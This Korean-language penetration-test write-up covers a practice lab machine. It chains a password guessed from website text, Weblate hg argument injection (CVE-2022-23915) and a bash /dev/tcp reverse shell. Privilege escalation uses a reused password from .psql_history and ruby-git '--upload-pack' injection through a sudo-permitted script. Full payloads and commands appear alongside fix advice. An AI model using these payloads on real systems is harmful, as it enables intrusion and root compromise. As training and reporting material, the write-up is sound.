---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/enum/dirbust
  - tech/web/cmd-injection
  - tech/exec/ssh-key
  - tech/cred/reuse
  - tech/lin/sudo-abuse
  - tech/payload/revshell
  - tech/web/info-disclosure
type: machine
platform: pg
os: linux
ip: 192.168.248.19
ports: [22, 80, 8000]
services: [http, ssh]
cves: [CVE-2022-23915, CVE-2022-25648]
status: solved
manual_tags: true
manual_cves: true
tech_count: 7
---

> [!info] 요약
> 타겟 192.168.248.19 · Ubuntu 22.04 · PG Practice Fundamental · 플래그 2개
> 진입점: tcp/80 본문의 "Editors Note" 힌트로 Weblate admin 비번 유추 → Weblate 4.11 hg 인자 주입(CVE-2022-23915)으로 tom 셸
> 권한상승: `.psql_history` 평문 비번의 시스템 계정 재사용 → `sudo` 로 허용된 `fetch.rb` 가 쓰는 ruby-git 1.10.2 인자 주입(CVE-2022-25648)으로 root
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.19

### Initial Access – 웹 본문 힌트로 유추한 비밀번호와 Weblate hg 인자 주입 체인으로 tom 셸 획득

**Vulnerability Explanation:**
- tcp/80 정적 템플릿 사이트 본문에 원본에 없는 문단이 손으로 끼워져 있음 — 소설 속 인물명이 admin 비밀번호 힌트
- Weblate REST API 를 익명으로 열람 가능(`IsAuthenticatedOrReadOnly`) — 사용자 `admin` 단독 확인, 로그인 대상이 하나로 좁혀짐
- Weblate 4.11 이하는 컴포넌트 생성 시 저장소 URL·브랜치명을 검증 없이 git/mercurial 명령 인자로 그대로 전달(CVE-2022-23915) — `-` 로 시작하는 값이 옵션으로 해석됨. hg 는 `--config=alias.X=!<cmd>` 로 임의 셸 명령 실행

**Vulnerability Fix:**
- Weblate 4.11.1 이상으로 업그레이드. VCS 저장소 URL·브랜치 값에 `-` 로 시작하는 입력 거부 또는 `--` 로 옵션 파싱 차단
- 공개 웹 본문에 비밀번호 추측에 쓰일 수 있는 개인정보(선호작·인물명 등) 게재 금지

**Severity:** High — 인증(레이트리밋 걸린 로그인 폼) 통과 후 RCE. 서비스 계정(tom) 권한 획득까지 자동

**Steps to reproduce the attack:**
1. tcp/80 본문 "Editors Note" 문단에서 비밀번호 힌트(작가 성) 확보
2. `/api/users/?format=json` 익명 조회로 계정이 `admin` 하나뿐임을 확인
3. `admin:niffenegger` 로 로그인 → 302 성공
4. `/create/project/` → `/create/component/` 에서 `vcs=mercurial`, `repo=http://localhost:8000`, `branch=--config=alias.pull=!<cmd>` 로 컴포넌트 생성 시도
5. 컴포넌트 생성 자체는 실패하나 `hg pull` 호출 시점에 alias 셸 명령이 이미 실행됨 — ICMP 로 우선 확인
6. 페이로드를 리버스셸로 교체해 재실행 → tom 셸 획득

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.19 | TCP: 22, 80, 8000 |

```text
PORT     STATE  SERVICE VERSION
22/tcp   open   ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4e:eb:da:e8:00:da:40:3d:f4:22:ad:fb:41:2c:2a:4c (ECDSA)
|_  256 de:dc:7b:84:9e:6e:d8:fa:98:23:2b:9e:71:67:88:fe (ED25519)
80/tcp   open   http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Book Bargains Online
443/tcp  closed https
8000/tcp open   http    WSGIServer 0.2 (Python 3.10.12)
|_http-title:   Weblate
| http-robots.txt: 31 disallowed entries (15 shown)
| /admin/ /js/ /accounts/ /source/ /comment/ /commit/ 
| /update/ /push/ /reset/ /lock/ /unlock/ /changes/ /changes/csv/ 
|_/search/ /replace/
|_http-server-header: WSGIServer/0.2 CPython/3.10.12
```
— 출처: `~/PG/Fikklish/nmap.log` (`-p-` 전체 포트, PORT 절 전문. 앞뒤의 OS 추정·traceroute 는 생략)

robots 의 `/admin/` 은 나중에 Django 관리자 폼 경로로 재확인됨 — 별도 레이트리밋 우회로로 오판해 시간을 태웠다([[_PLAYBOOK]] 참조).

`WSGIServer/0.2` 는 Django 개발 서버(`manage.py runserver`)임. 운영 배포라면 gunicorn/uwsgi + nginx 조합이 일반적 — 이 한 줄이 "DEBUG 가 켜져 있을 수 있다" 는 첫 신호였고 실제로 켜져 있었음.

UDP top-100 전부 `open|filtered`(무응답) — 볼 것 없음.

**tcp/80 — 정적 템플릿, 본문만 손으로 고쳐짐**

FreeHTML5 "Show" 무료 템플릿을 그대로 사용한 서점 사이트. `gobuster` 를 `common.txt`·medium 두 워드리스트로 실행, 나온 것은 전부 템플릿 구조물.

```text
/.hta                 (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/css                  (Status: 301) [Size: 314] [--> http://192.168.248.19/css/]
/fonts                (Status: 301) [Size: 316] [--> http://192.168.248.19/fonts/]
/images               (Status: 301) [Size: 317] [--> http://192.168.248.19/images/]
/index.html           (Status: 200) [Size: 18258]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.248.19/javascript/]
/js                   (Status: 301) [Size: 313] [--> http://192.168.248.19/js/]
/server-status        (Status: 403) [Size: 279]
```
— 출처: `~/PG/Fikklish/gobuster_80.txt` 전문(`common.txt`). medium 워드리스트 실행(`gobuster_80_big.txt`)이 추가로 낸 것은 `/README.txt` (200, 759) 와 `/sass` (301) 둘뿐이고 나머지는 같은 집합 — ANSI 색코드가 섞여 있어 여기 싣지 않음

`README.txt` 도 템플릿 원본 그대로("DESIGNED & DEVELOPED by FREEHTML5.co"). 403 인 `/server-status`·`.ht*` 는 Apache 기본 차단. 손댄 곳은 `index.html` 본문 텍스트뿐.

본문에 템플릿에 없는 문단 두 개가 끼어 있음.

> Editors Note: As an editor for our online book store, I have had the pleasure of reading many wonderful books. But out of all of them, "The Time Traveler's Wife" by **Audrey Niffenegger** stands out as my absolute favorite. …

> Multinational — … we are in the process of **translating our website into over 10 different languages** to better serve our international community. …

(둘 다 앞부분만 인용 — 전문은 `~/PG/Fikklish/index80.html`)

두 번째 문단은 8000번 포트(번역 플랫폼)를 가리키는 표지판, 첫 번째는 관리자 최애 책이라는 전형적 비밀번호 힌트.

![[PG-Fikklish-port80-hint.png]]
— 헤드리스 크로미움 캡처(1280×900)라 첫 화면만 잡힘. **위 두 문단은 스크롤 아래라 이 이미지에 없음** — 본문 근거는 `index80.html`

**tcp/8000 — Weblate 4.11**

버전 근거 셋 교차 확인 — 정적 자산 쿼리스트링 `?v=4.11`, 헤더 문서 링크 `docs.weblate.org/en/weblate-4.11/`, 푸터 `Powered by Weblate 4.11`.

![[PG-Fikklish-weblate411.png]]

익명으로 REST API 열람 가능(`DEFAULT_PERMISSION_CLASSES` = `IsAuthenticatedOrReadOnly`).

```bash
ssh kali@10.44.44.128 "curl -s 'http://192.168.248.19:8000/api/users/?format=json'"
```
```json
{"count":2,"next":null,"previous":null,"results":[{"full_name":"Anonymous","username":"anonymous"},{"full_name":"Weblate Admin","username":"admin"}]}
```

`/api/projects/`·`/api/components/` 는 `count:0`. 사용자는 `admin` 하나, 프로젝트는 0개 — 붙을 계정이 admin 밖에 없고 익명이 건드릴 데이터도 없음이 이 시점에 확정됨.

**Django DEBUG=True**

없는 경로 요청 시 Django technical 404(URLconf 221개 나열)가 뜸 — DEBUG 켜짐 신호. `/media/<path>` 는 DEBUG 모드에서 `django.views.static.serve` 가 처리하므로 트래버설로 예외(`SuspiciousFileOperation`)를 유발해 technical 500 을 봄.

```bash
ssh kali@10.44.44.128 "curl -s --path-as-is 'http://192.168.248.19:8000/media/%2e%2e%2f%2e%2e%2fsecret' -o ~/PG/Fikklish/debug_traceback.html"
```

`--path-as-is` 가 핵심 — 없으면 curl 이 클라이언트 쪽에서 `..` 를 먼저 정규화해 서버에는 `/secret` 만 도착, 그냥 404 로 끝남. 인코딩과 이 플래그 둘 다 필요.

113KB 짜리 응답에서:

```text
The joined path (/home/tom/.local/lib/python3.10/site-packages/secret) is located
outside of the base path component (/home/tom/.local/lib/python3.10/site-packages/data/media)
```
— 출처: `~/PG/Fikklish/debug_traceback.html`

OS 사용자명 `tom` 과 설치 경로가 여기서 확보됨. 하단 Settings 표에서 추가 확보(전문은 `~/PG/Fikklish/settings_dump.txt`):

| 설정 | 값 | 비고 |
|---|---|---|
| `DEBUG` | `True` | 이 페이지 자체의 원인 |
| `BASE_DIR` | `/home/tom/.local/lib/python3.10/site-packages` | pip `--user` 설치 |
| `DATABASES` | postgresql @ 127.0.0.1 / weblate | 비번은 `***` 로 마스킹됨 |
| `EMAIL_HOST` / `PORT` | `localhost` / `25` | 메일 가로채기를 시도했으나 헛다리([[_PLAYBOOK]] 참조) |
| `REGISTRATION_OPEN` | `True` | 가입 폼은 열려 있음 |
| `AUTH_LOCK_ATTEMPTS` | `10` | 계정당 실패 10회면 비밀번호 무효화 |
| `RATELIMIT_ATTEMPTS` | `5` | IP당 5회/5분 |
| `IP_BEHIND_REVERSE_PROXY` | `False` | `X-Forwarded-For` 로 레이트리밋 우회 불가 |

Django technical 500 의 `META` 섹션에는 `wsgiref` 가 WSGI environ 에 프로세스 환경변수를 섞어 넣어 `USER='tom'`·`HOME='/home/tom'`·`SERVER_NAME='fikklish'` 까지 노출됨.

![[PG-Fikklish-django-debug.png]]

### Initial Access – Weblate hg 인자 주입(CVE-2022-23915)으로 tom 셸

인자 주입은 셸 메타문자 삽입과 다름 — `subprocess`(shell=False)로 안전하게 호출해도 **사용자 값이 argv 한 칸을 통째로 차지하면** 대상 프로그램이 그 값을 옵션으로 해석할 수 있음. 값이 `-` 로 시작하면 됨. Weblate 4.11 이하는 컴포넌트의 저장소 URL·브랜치명을 그대로 git/mercurial 인자로 넘김(4.11.1 에서 수정).

페이로드:

```text
--config=alias.pull=!ping -c 3 192.168.45.207
```

| 조각 | 역할 |
|---|---|
| `--config=` | 브랜치명이 hg 옵션으로 해석되게 만드는 부분 — `-` 로 시작하는 것이 전부 |
| `alias.pull=` | hg 설정의 alias 섹션에 `pull` 별칭 정의 |
| `!` | hg alias 문법에서 「뒤는 셸 명령」을 뜻하는 접두사 |
| `ping -c 3 ...` | 실행될 명령 |

Weblate 는 컴포넌트를 저장할 때 저장소를 실제로 clone/pull 하므로(`component.clean_repo()` → `sync_git_repo(validate=True)`) `hg pull` 이 불리고 그 순간 별칭이 실행됨. 컴포넌트 생성은 실패하지만 명령은 그 전에 이미 실행됨 — 응답 실패가 익스플로잇 실패를 뜻하지 않음. 실패 사유는 시도마다 달랐음(`journalctl -u weblate` 의 `WeblateLockTimeout` 등, 첫 시도의 예외 종류는 저널 tail 밖이라 관측 없음). 판정은 응답이 아니라 `tcpdump` 로 함.
— 출처: `~/PG/Fikklish/traces_confirmed.log` 의 `WEBLATE LOG TAIL`

**로그인** — 사용자가 `admin` 하나뿐이라 비밀번호만 맞추면 됨. 웹 본문에서 사전을 만듦.

```bash
ssh kali@10.44.44.128 "cd ~/PG/Fikklish && cewl -d 1 -m 5 -c http://192.168.248.19/ -w cewl.txt"
```

`-c` 로 빈도를 함께 뽑으면 `Traveler, 8 / Henry, 8 / Clare, 6 / Audrey, 4 / Niffenegger, 4` 가 보임(출처: `~/PG/Fikklish/cewl.txt`). 348 단어 사전을 그대로 웹 폼에 먹이는 것은 레이트리밋 때문에 애초에 불가능한 계획이었음(자세한 계산은 [[_PLAYBOOK]]). Editors Note 가 지목한 고유명사를 손으로 골라야 함. `cewl -c` 로 뽑은 파일은 `Niffenegger, 4` 형식이라 그대로 사전 공격에 못 씀 — 빈도는 눈으로 보고 후보는 따로 입력.

정답은 소문자 — `admin:niffenegger`.

```bash
ssh kali@10.44.44.128 "/tmp/one.sh admin niffenegger"
```
```text
[admin:niffenegger] 302|http://192.168.248.19:8000/ msg=
```
— `/tmp/one.sh` 와 이 출력은 `~/PG/Fikklish/` 에 미보존 — 화면 자체는 근거부족. 로그인 성립의 방증 둘 — `c.txt`(libcurl 쿠키 파일에 `sessionid` 저장됨)와 `wl_rce.py` 가 `USER, PW = "admin", "niffenegger"` 를 박아 두고 실제로 RCE 에 성공한 사실

로그인 성공 판정은 302(Django `LoginView` 는 실패 시 폼을 200 으로 재렌더).

**RCE** — `~/PG/Fikklish/wl_rce.py` 가 로그인 → 프로젝트 생성 → 컴포넌트 생성을 한 번에 수행. 폼 필드 요지:

| 필드 | 값 |
|---|---|
| `vcs` | `mercurial` |
| `repo` | `http://localhost:8000` |
| `branch` | `--config=alias.pull=!<명령>` |
| `project` | `1` (앞서 만든 poc) |
| `source_language` | 페이지 `<option>` 에서 English 의 pk 파싱 |

먼저 ICMP 로 실행 여부만 확인 — 리버스셸을 바로 던지면 "실행 실패" 와 "아웃바운드 차단" 을 구별할 수 없음.

```bash
ssh kali@10.44.44.128 "python3 ~/PG/Fikklish/wl_rce.py 'ping -c 3 192.168.45.207' pocping"
```
```text
19:19:22.277392 IP 192.168.248.19 > 192.168.45.207: ICMP echo request, id 1, seq 1, length 64
19:19:22.278412 IP 192.168.45.207 > 192.168.248.19: ICMP echo reply, id 1, seq 1, length 64
19:19:23.277663 IP 192.168.248.19 > 192.168.45.207: ICMP echo request, id 1, seq 2, length 64
19:19:23.277699 IP 192.168.45.207 > 192.168.248.19: ICMP echo reply, id 1, seq 2, length 64
19:19:24.278143 IP 192.168.248.19 > 192.168.45.207: ICMP echo request, id 1, seq 3, length 64
19:19:24.278172 IP 192.168.45.207 > 192.168.248.19: ICMP echo reply, id 1, seq 3, length 64
19:19:24.798284 IP 192.168.248.19 > 192.168.45.207: ICMP echo request, id 2, seq 1, length 64
19:19:24.798339 IP 192.168.45.207 > 192.168.248.19: ICMP echo reply, id 2, seq 1, length 64
19:19:25.798473 IP 192.168.248.19 > 192.168.45.207: ICMP echo request, id 2, seq 2, length 64
19:19:25.798503 IP 192.168.45.207 > 192.168.248.19: ICMP echo reply, id 2, seq 2, length 64
19:19:26.800575 IP 192.168.248.19 > 192.168.45.207: ICMP echo request, id 2, seq 3, length 64
19:19:26.800609 IP 192.168.45.207 > 192.168.248.19: ICMP echo reply, id 2, seq 3, length 64
```
— 출처: `~/PG/Fikklish/icmp.log` 전문 (`tcpdump -i tun0 -n icmp`)

`ping -c 3` 한 번 시켰는데 `id` 가 1 과 2 로 각각 seq 1~3 씩 두 번 완주함 — ping 프로세스가 두 개 떴다는 뜻. **[가정]** 원인은 Weblate 가 컴포넌트 검증 과정에서 hg 를 두 번 호출하기 때문으로 보이나 호출 횟수를 직접 센 기록은 없음. 실무 함의는 하나 — 페이로드가 여러 번 실행될 수 있으니 리버스셸 전에 ICMP 로 횟수를 먼저 볼 것.

**리버스셸**

```bash
ssh kali@10.44.44.128 "python3 ~/PG/Fikklish/wl_rce.py \"bash -c 'bash -i >& /dev/tcp/192.168.45.207/443 0>&1'\" rev443b"
```

443 으로 붙음. 먼저 던진 컴포넌트(`rev443`)의 리스너 로그가 파일로 남아 있음:

```text
bash: cannot set terminal process group (900): Inappropriate ioctl for device
bash: no job control in this shell
</lib/python3.10/site-packages/data/vcs/poc/rev443$ 
```
— 출처: `~/PG/Fikklish/shell443.log` (파일은 여기서 끝남 — `| tee` 버퍼링으로 뒤가 안 담김. 원인은 [[_PLAYBOOK]])

실제로 명령을 친 것은 두 번째 셸(`rev443b`). 프롬프트가 `rev443$` → `rev443b$` 로 바뀐 것이 두 셸을 가르는 표식임. 이쪽 화면은 `tmux capture-pane` 으로만 봤고 파일로는 남기지 않음.

```text
listening on [any] 443 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.19] 57430
bash: cannot set terminal process group (900): Inappropriate ioctl for device
bash: no job control in this shell
<lib/python3.10/site-packages/data/vcs/poc/rev443b$ id; whoami; hostname; hostname -I; date -u
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd)
tom
fikklish
192.168.248.19
Thu Aug 20 10:25:44 UTC 2026
```
— 출처: `tmux capture-pane` 화면. 대응 파일 없음 — 화면 자체는 근거부족. 다만 값은 두 갈래로 교차 확인됨. ① 소스 포트 `57430` 이 `~/PG/Fikklish/reg_smtp.pcap` 에 `19:25:26.171960 IP 192.168.248.19.57430 > 192.168.45.207.443: Flags [S]` 로 남아 있고, `date -u` 의 `10:25:44 UTC`(=KST 19:25:44)가 그 SYN 의 18초 뒤임. ② 이 블록의 `date -u` 에는 `AM` 이 없는데 같은 호스트의 `proof_user.txt`·`harvest_tom.txt` 는 `10:26:46 AM UTC 2026` 형식임 — 서비스에서 태어난 셸(C 로캘)과 `LANG` 을 물려받은 SSH 세션의 glibc 로캘 차이라, 두 블록이 서로 다른 세션에서 나왔다는 표지

`(900)` 은 Weblate `runserver` 마스터 프로세스의 PID.

```text
tom  900  0.0  0.5 252664  5204 ?  Ss  09:23  0:01 /usr/bin/python3 /home/tom/.local/bin/weblate runserver 0.0.0.0:8000
```
— 출처: `~/PG/Fikklish/harvest_root.txt`

셸이 웹 프로세스의 프로세스 그룹 안에서 태어났다는 뜻 — `cannot set terminal process group` 은 고장이 아니라 「pty 없이 붙었다」는 표시.

**SSH 키로 안정화**

```bash
mkdir -p /home/tom/.ssh; chmod 700 /home/tom/.ssh
echo '<pubkey>' >> /home/tom/.ssh/authorized_keys; chmod 600 /home/tom/.ssh/authorized_keys
```

`~` 를 쓰면 안 됨 — Weblate 가 VCS 작업용으로 `HOME` 을 `DATA_DIR/home` 으로 바꿔 놓아 `~/.ssh/authorized_keys` 는 `/home/tom/.local/lib/python3.10/site-packages/data/home/.ssh/authorized_keys` 로 떨어짐. 절대경로로 다시 심어 해결.

**Local.txt value:**
`f7839e08cb34410ad9e665421c7873ea`

```text
tom
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd)
fikklish
192.168.248.19 
Thu Aug 20 10:26:46 AM UTC 2026
f7839e08cb34410ad9e665421c7873ea
Connection to 192.168.248.19 closed.
```
— 출처: `~/PG/Fikklish/proof_user.txt` 전문 (`ssh -tt -i fik_key tom@192.168.248.19` 1회 호출 — `-tt` 가 pty 를 강제하므로 `traces_confirmed.log` 의 wtmp 에 `tom pts/0 192.168.45.207 … 10:26` 으로 기록됨. 명령이 끝나며 `Connection ... closed`)

### Privilege Escalation – ruby-git 인자 주입(CVE-2022-25648)으로 sudo 스크립트 경유 root

**Vulnerability Explanation:**
- tom 홈의 `.psql_history` 가 살아 있음(`.bash_history` 만 `/dev/null` 링크) — PostgreSQL 클라이언트 히스토리에 관리자가 설정한 DB 평문 비밀번호가 남음
- 히스토리에 남은 두 값 중 하나(`RapidlyLockstepDrenched103`)가 tom 의 시스템(SSH/sudo) 비밀번호로 재사용됨
- `sudo -l` 로 root 소유 `/home/tom/fetch.rb`·`/home/tom/checkout.rb` 실행 허용 확인. 두 스크립트 자체는 무해하나 의존 gem `ruby-git 1.10.2` 가 `fetch`/`checkout` 호출 시 인자(origin·ref)를 검증 없이 `git fetch <origin> <ref>` 로 조립(CVE-2022-25648). git 은 로컬 전송에서 `--upload-pack=<cmd>` 를 실행 훅으로 그대로 실행함

**Vulnerability Fix:**
- ruby-git 을 1.11.0 이상으로 업그레이드
- DB 비밀번호를 시스템 계정 비밀번호로 재사용하지 않음. `psql` 은 `\password` 사용 시 히스토리에 평문이 남지 않음
- `sudo` 로 허용하는 스크립트는 인자·표준입력을 스스로 검증해야 하며, 그 스크립트가 의존하는 라이브러리의 알려진 취약점도 함께 점검해야 함

**Severity:** Critical — 낮은 권한 셸에서 즉시 root

**Steps to reproduce the attack:**
1. `harvest.sh` 로 tom 홈 열거 → `.psql_history` 발견(`.bash_history` 만 `/dev/null`)
2. 평문 비밀번호 2개 확보 → 순서대로 `sudo -S -l` 로 시험. 통한 것은 **최신 값이 아니라 첫 번째 값**(`RapidlyLockstepDrenched103`) — 히스토리 순서로 최신 값을 먼저 찍지 말고 전부 시험할 것
3. `sudo -S -l` 재실행(비번 확보 전 `sudo -n -l` 은 "password required" 로만 응답) → `fetch.rb`·`checkout.rb` 허용 확인
4. `gem list git` 으로 `ruby-git 1.10.2` 확인(CVE-2022-25648 대상)
5. `git fetch <origin> --upload-pack=<cmd>` 인자 주입을 로컬에서 재현해 원리 확인
6. `sudo /home/tom/fetch.rb` 실행 시 origin/ref 자리에 `--upload-pack=sh /tmp/r.sh` 를 넣어 root 로 명령 실행

tom 홈이 그대로 답이었음. 열거는 SSH 세션에서 손으로 함(KST 19:27) — `~/PG/_lib/harvest.sh` 는 그보다 뒤인 19:29, **root 획득 이후**에 tom·root 두 레벨로 돌려 `harvest_tom.txt`·`harvest_root.txt` 로 회수했으므로 발견 경로가 아니라 사후 채증임(근거: 두 파일 mtime 19:29:13·19:29:25, `traces_confirmed.log` 의 `Aug 20 10:29:04 … COMMAND=list`).

```text
-rwxr-xr-x 1 root root  186 Apr 25  2025 checkout.rb
-rwxr-xr-x 1 root root  260 Apr 25  2025 fetch.rb
-rw------- 1 tom  tom   175 Apr 25  2025 .psql_history
lrwxrwxrwx 1 root root    9 Apr 25  2025 .bash_history -> /dev/null
```
— 출처: 그 세션의 `ls -la /home/tom`. 화면 미보존 — 근거부족. 다만 `.bash_history` 행은 `traces_confirmed.log` 의 `lrwxrwxrwx 1 root root 9 Apr 25  2025 /home/tom/.bash_history -> /dev/null` 과 일치하고, 두 `.rb` 는 `sudo -l` 출력으로 실재가 확인됨

`.bash_history` 는 `/dev/null` 링크지만 `.psql_history` 는 살아 있음 — 셸 히스토리만 지우고 클라이언트 히스토리를 빠뜨린 전형.

```text
GRANT ALL PRIVILEGES ON DATABASE WEBLATE to WEBLATE;
ALTER USER WEBLATE PASSWORD 'RapidlyLockstepDrenched103';
q
\q
ALTER USER WEBLATE PASSWORD 'RollingShockingLifter231';
\q
```
— 출처: tom SSH 세션에서 `cat /home/tom/.psql_history`. 이 세션 화면 자체는 파일로 남기지 않음 — 두 값이 실재했다는 방증은 `~/PG/Fikklish/trysudo.sh`(둘을 순서대로 시험)와 `traces_confirmed.log` 의 `/root/projects/RapidlyLockstepDrenched103` 디렉터리명

두 값 중 어느 것이 시스템 비번인지는 `~/PG/Fikklish/trysudo.sh` 로 순서대로 시험해 가림(`for p in RapidlyLockstepDrenched103 RollingShockingLifter231; do echo "$p" | sudo -S -l; done`) — 최신 값이 아니라 **첫 번째 값**이 통했음(`/root/projects/RapidlyLockstepDrenched103` 이 그 방증). `sudo -n -l` 은 "a password is required" 만 반환하므로 여기서 멈추면 안 됨 — 비번을 확보했으면 다시 물어야 함. 아래 블록이 그 둘을 나란히 보여줌.

```text
===== SUDO =====
sudo: a password is required
(sudo -n 실패 — 비밀번호 필요)
-- sudo -S -l (HARVEST_PW) --
[sudo] password for tom: Matching Defaults entries for tom on fikklish:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User tom may run the following commands on fikklish:
    (ALL) /home/tom/checkout.rb
    (ALL) /home/tom/fetch.rb
```
— 출처: `~/PG/Fikklish/harvest_tom.txt` (`HARVEST_PW=RapidlyLockstepDrenched103 sh harvest.sh`)

두 스크립트는 root 소유지만 내용은 평범함 — 취약한 것은 스크립트가 아니라 그것이 쓰는 gem.

```ruby
#!/usr/bin/ruby
require 'git'
name = gets
g = Git.init('/root/projects/' + name.chomp)
origin = gets
ref = gets
g.fetch(origin.chomp, {:ref => ref.chomp} )
```

gem 버전은 tom 의 대화형 SSH 세션(`ssh -tt -i fik_key tom@192.168.248.19`)에서 확인.

```text
tom@fikklish:~$ gem list git
git (1.10.2)
```
— 출처: 그 세션 화면. 파일로는 남기지 않음 — 화면 자체는 근거부족. 같은 값이 `~/PG/Fikklish/privesc.sh` 주석(`ruby-git 1.10.2`)과 익스플로잇 예외 메시지의 경로 `gems/git-1.10.2/lib/git/lib.rb` 로 두 번 더 확인됨

ruby-git 1.10.2 는 `fetch` 를 `git fetch <origin> <ref>` 로 조립(CVE-2022-25648). 어드바이저리 본문이 지목하는 것은 `remote`(=origin) 인자이나, 이 박스의 실측 예외 메시지에서는 **`ref` 자리 값도 검증 없이 그대로 argv 로 흘렀음**(예외 메시지의 `fetch 'poc' '--upload-pack=sh /tmp/r.sh'`). git 의 `--upload-pack=<cmd>` 옵션은 원격이 로컬 경로로 해석되는 전송(local transport)에서 git 이 그 명령을 직접 실행함 — 값 하나를 옵션으로 만들면 root 로 임의 명령이 돎.

이 동작은 타겟과 무관하게 로컬에서 재현됨.

```bash
ssh kali@10.44.44.128 "mkdir -p /tmp/audtest2 && cd /tmp/audtest2 && git init -q . && git --version && git fetch poc --upload-pack='sh -c \"touch /tmp/aud_hit2\"'; echo \"exit=\$?\"; ls -l /tmp/aud_hit2"
```
```text
git version 2.51.0
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
exit=128
-rw-rw-r-- 1 kali kali 0 Aug 26 12:11 /tmp/aud_hit2
```

`poc` 원격은 존재하지 않아 exit 128 로 죽는데 `touch` 는 이미 실행돼 파일이 생김 — 이 박스도 같은 모양으로 뚫림.

```bash
printf '<pw>\npoc\n--upload-pack=sh /tmp/r.sh\n/root/projects/poc\n' | sudo -S /home/tom/fetch.rb
```
— 출처: `~/PG/Fikklish/privesc.sh`(원문은 `printf '%s\n…' "$PW"`, 비번만 `<pw>` 로 가림)

`/tmp/r.sh` 는 root 의 `authorized_keys` 에 공개키를 추가. 실행된 실제 명령은 ruby 예외 메시지에 통째로 찍힘.

```text
/var/lib/gems/3.0.0/gems/git-1.10.2/lib/git/lib.rb:1115:in `command': git '--git-dir=/root/projects/RapidlyLockstepDrenched103/.git' '--work-tree=/root/projects/RapidlyLockstepDrenched103' '-c' 'core.quotePath=true' '-c' 'color.ui=false' fetch 'poc' '--upload-pack=sh /tmp/r.sh'  2>&1:fatal: Could not read from remote repository. (Git::GitExecuteError)
```
— 출처: `privesc.sh` 실행 화면. 그 화면은 파일로 미보존 — 근거부족. 다만 여기 찍힌 `/root/projects/RapidlyLockstepDrenched103` 디렉터리가 `~/PG/Fikklish/traces_confirmed.log` 에 실재(`drwxr-xr-x 3 root root … RapidlyLockstepDrenched103`)해 비번이 프로젝트명 자리로 밀린 사실이 별도로 확인됨

`/tmp/r.sh` 가 남긴 `/tmp/whoami_check`:

```text
uid=0(root) gid=0(root) groups=0(root)
```
— 같은 파일이 `traces_confirmed.log` 에 `-rw-r--r-- 1 root root 39 Aug 20 10:28 /tmp/whoami_check` 로 잡힘. 위 39바이트가 그 크기와 일치

`fetch` 는 실패했는데 명령은 이미 실행됨 — 응답 실패가 익스플로잇 실패를 뜻하지 않는 것은 여기서도 동일. 입력이 한 칸씩 밀려 프로젝트명 자리에 비밀번호가, ref 자리에 페이로드가 들어갔는데도 통함 — `sudo` 가 직전 호출의 자격 캐시를 써서 stdin 첫 줄을 소비하지 않았고, git 은 옵션 위치를 가리지 않으므로 `--upload-pack=` 이 ref 자리에 있어도 옵션으로 인식됨.

`checkout.rb` 도 같은 gem 의 `checkout(branch)` 를 쓰므로 동일 방식으로 뚫림. `fetch.rb` 쪽이 `--upload-pack` 이라는 확실한 실행 훅을 쥐고 있어 더 안정적.

**시도하지 않은 대안 경로 — tom 의 `lxd` 그룹 멤버십**

셸 획득 직후 `id` 에 `110(lxd)` 가 있었음(`uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd)`). **[가정] — 이 박스에서는 시도하지 않음.** lxd 그룹은 사실상 root 와 동등하게 취급되는 대표적 그룹으로, lxd 데몬이 root 로 도는 상태에서 그룹 멤버는 컨테이너를 만들 수 있고 `security.privileged=true` 로 호스트 `/` 를 마운트해 붙이면 컨테이너 안의 root 로 호스트 파일을 그대로 쓸 수 있음. `sudo -l` 이 이미 열려 있어 이 경로까지 가지 않음 — lxd 데몬이 실제로 떠 있었는지, 사용 가능한 이미지가 있었는지는 확인하지 않음(관측 없음).

### Post-Exploitation

**Proof.txt value:**
`7c3828a8fc14c10f1ccba90127c3a3bc`

```text
root
uid=0(root) gid=0(root) groups=0(root)
fikklish
192.168.248.19 
Thu Aug 20 10:28:48 AM UTC 2026
7c3828a8fc14c10f1ccba90127c3a3bc
Connection to 192.168.248.19 closed.
```
— 출처: `~/PG/Fikklish/proof_root.txt` 전문 (`ssh -tt -i fik_key root@192.168.248.19` 1회 호출 — wtmp 에 `root pts/0 192.168.45.207 … 10:28`)

둘 다 표준 위치, 미끼 파일 없음. `ssh -tt` 로 pty 를 강제해 대화형 셸에서 원위치 `cat` 한 결과 — 웹셸로 읽은 값은 시험에서 0점. 타겟 `date` 는 UTC, Kali 는 KST 라 로그 대조 시 9시간 환산 필요(`10:26:46 UTC` = Kali mtime `19:26:46`).

**남긴 흔적**

타겟에서 되돌린 것(root 로 확인, `~/PG/Fikklish/traces_confirmed.log`):

| 남긴 것 | 처리 |
|---|---|
| Weblate 프로젝트 `poc` | ORM 으로 삭제(celery 부재로 UI 삭제 미동작). 삭제 직전 ORM 열거는 `before: ['poc'] []` — **컴포넌트 레코드는 0개**(생성이 매번 실패했으므로 프로젝트만 남음). `after: [] []` 로 복귀 확인 |
| `/home/tom/.local/.../data/vcs/poc`, `.../vcs/project` | 삭제(둘 다 생성분, mtime 확인) |
| `/home/tom/.ssh/`(생성분) | 디렉터리째 삭제 |
| `/root/.ssh/authorized_keys` | `cat` 결과가 우리가 심은 `ssh-ed25519 … kali@kali` **한 줄뿐**(= root 에 원래 등록된 키 없음)이라 파일째 삭제 |
| `/root/projects/`(익스플로잇 생성) | 삭제 |
